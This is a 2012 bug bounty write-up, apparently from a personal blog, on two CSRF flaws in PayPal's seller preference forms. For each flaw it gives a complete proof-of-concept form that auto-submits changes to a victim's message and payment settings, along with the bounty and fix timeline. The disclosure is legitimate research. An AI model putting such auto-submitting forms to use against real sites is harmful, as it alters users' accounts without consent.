---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2012-10-12_my-experience-with-the-paypal-bug-bounty-programme.md
original_filename: 2012-10-12_my-experience-with-the-paypal-bug-bounty-programme.md
title: My Experience with the PayPal Bug Bounty Programme
category: documents
detected_topics:
- xss
- command-injection
- otp
- csrf
- cloud-security
tags:
- imported
- documents
- xss
- command-injection
- otp
- csrf
- cloud-security
language: en
raw_sha256: c56b69f3dc322848f9aff38ebedb2e2e70fbe9ceeb30f9bfb612e3e505a2fd13
text_sha256: 0cea658b4c6257c6e5790ff8facdba3ed477454cbd3c1135525e04a8f0e63c17
ingested_at: '2026-06-28T07:31:55Z'
sensitivity: unknown
redactions_applied: false
---

# My Experience with the PayPal Bug Bounty Programme

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2012-10-12_my-experience-with-the-paypal-bug-bounty-programme.md
- Source Type: markdown
- Detected Topics: xss, command-injection, otp, csrf, cloud-security
- Ingested At: 2026-06-28T07:31:55Z
- Redactions Applied: False
- Raw SHA256: `c56b69f3dc322848f9aff38ebedb2e2e70fbe9ceeb30f9bfb612e3e505a2fd13`
- Text SHA256: `0cea658b4c6257c6e5790ff8facdba3ed477454cbd3c1135525e04a8f0e63c17`


## Content

---
title: "My Experience with the PayPal Bug Bounty Programme"
page_title: "My Experience with the PayPal Bug Bounty Programme – Jack"
url: "https://whitton.io/archive/my-experience-with-the-paypal-bug-bounty-programme/"
final_url: "https://whitton.io/archive/my-experience-with-the-paypal-bug-bounty-programme/"
authors: ["Jack Whitton (@fin1te)"]
programs: ["Paypal"]
bugs: ["CSRF"]
bounty: "750"
publication_date: "2012-10-12"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6414
---

# [My Experience with the PayPal Bug Bounty Programme](https://whitton.io/archive/my-experience-with-the-paypal-bug-bounty-programme/ "My Experience with the PayPal Bug Bounty Programme")

## October 12, 2012

__Reading time ~1 minute

Rather than start off with a generic “Hello, World” post, I’ll discuss my submissions to the PayPal Bug Bounty programme.

#### Vulnerability #1

The first is a CSRF issue in the “Customer Service Message” form of “My Selling Preferences”. There is no token like there is on most of the other pages, which makes it trivial to change the values.
  
  
  <form id="csrf_form" action="https://www.paypal.com/uk/cgi-bin/webscr?cmd=_profile-seller-message-submit" method="post">
  <input type="hidden" name="seller_customized_message" value="CSRF!">
  <input type="hidden" name="chars_left" value="1995">
  <input type="hidden" name="form_charset" value="UTF-8">
  <input type="hidden" name="submit.x" value="Submit">
  </form>
  <script>document.getElementById('csrf_form').submit();</script>

##### Before

[ ![](/images/pcsrf/paypal-csrf-csm-before.png) ](/images/pcsrf/paypal-csrf-csm-before.png)

##### After

[ ![](/images/pcsrf/paypal-csrf-csm-after.png) ](/images/pcsrf/paypal-csrf-csm-after.png)

#### Vulnerability #2

Another CSRF issue, in the “Payment Receiving Preferences” form of “My Selling Preferences”
  
  
  <form id="csrf_form" action="https://www.paypal.com/uk/cgi-bin/webscr" method="post">
  <input type="hidden" name="cmd" value="_profile-pref-submit">
  <input type="hidden" name="pref_closed_balance" value="manual">
  <input type="hidden" name="pref_duplicate_invoice_id" value="yes">
  <input type="hidden" name="pref_apu" value="http://">
  <input type="hidden" name="pref_block_youth_payments" value="no">
  <input type="hidden" name="cc_statement_name" value="CSRF!">
  <input type="hidden" name="cc_statement_longname" value="CSRF!">
  <input type="hidden" name="form_charset" value="UTF-8">
  <input type="hidden" name="change.x" value="Save">
  </form>
  <script>document.getElementById('csrf_form').submit();</script>

##### Before

[ ![](/images/pcsrf/paypal-csrf-prp-before.png) ](/images/pcsrf/paypal-csrf-prp-before.png)

##### After

[ ![](/images/pcsrf/paypal-csrf-prp-after.png) ](/images/pcsrf/paypal-csrf-prp-after.png)

Whilst these issues are not that severe, they are mitigated easily and there isn’t really an excuse to not have them patched.

From submission to fixed, the whole process took approx. 4 months. A fairly long time, but forgivable since the programme was brand new when I participated. The reward was given in two stages, $250 when the bugs were confirmed, and an additional $500 when they were fixed.

[paypal](https://whitton.io/tags/#paypal "Pages tagged paypal")[bug-bounty](https://whitton.io/tags/#bug-bounty "Pages tagged bug-bounty")[csrf](https://whitton.io/tags/#csrf "Pages tagged csrf")[websec](https://whitton.io/tags/#websec "Pages tagged websec") Updated on October 12, 2012 Jack

  * [__Like](https://www.facebook.com/sharer/sharer.php?u=https://whitton.io/archive/my-experience-with-the-paypal-bug-bounty-programme/ "Share on Facebook")
  * [__Tweet](https://twitter.com/intent/tweet?text=https://whitton.io/archive/my-experience-with-the-paypal-bug-bounty-programme/ "Share on Twitter")
  * [__+1](https://plus.google.com/share?url=https://whitton.io/archive/my-experience-with-the-paypal-bug-bounty-programme/ "Share on Google Plus")

[Read More](https://whitton.io)

### [From Bug Bounty Hunter, to Engineer, and Beyond](https://whitton.io/articles/from-researcher-to-engineer-and-beyond/ "From Bug Bounty Hunter, to Engineer, and Beyond")

A couple weeks ago I had my last day on Facebook's Product Security team. Abittersweet moment, but one which marks a "new chapter" in my ...… [Continue reading](https://whitton.io/articles/from-researcher-to-engineer-and-beyond/)

#### [Obtaining Login Tokens for an Outlook, Office or Azure Account](https://whitton.io/articles/obtaining-tokens-outlook-office-azure-account/ "Obtaining Login Tokens for an Outlook, Office or Azure Account")

Published on April 03, 2016

#### [Uber Bug Bounty: Turning Self-XSS into Good-XSS](https://whitton.io/articles/uber-turning-self-xss-into-good-xss/ "Uber Bug Bounty: Turning Self-XSS into Good-XSS")

Published on March 22, 2016
